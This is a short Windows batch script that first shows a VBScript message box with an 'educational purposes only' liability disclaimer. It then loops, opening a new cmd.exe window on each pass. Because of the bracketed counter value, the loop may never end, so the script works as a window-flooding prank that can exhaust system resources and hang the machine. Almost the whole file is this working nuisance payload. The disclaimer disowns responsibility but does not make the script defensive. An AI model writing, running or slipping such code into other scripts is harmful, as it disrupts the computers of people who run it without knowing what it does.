@echo off
echo x=msgbox("All files here are to be used for educational purposes only. Use all files as is; any modifications in any way immediatly deem them as no longer our responsibility. Any lawful action taken against individuals or an organization from use/distribution of these files is not our responsibility regardless of files edits or lack thereof (after posted publish date)." ,16, "WARNING") >> msgbox.vbs
start msgbox.vbs
pause
set loopcount=[10000]
:loop
echo meep
START cmd.exe
set /a loopcount=loopcount-1
if %loopcount%==0 goto exitloop
goto loop
:exitloop
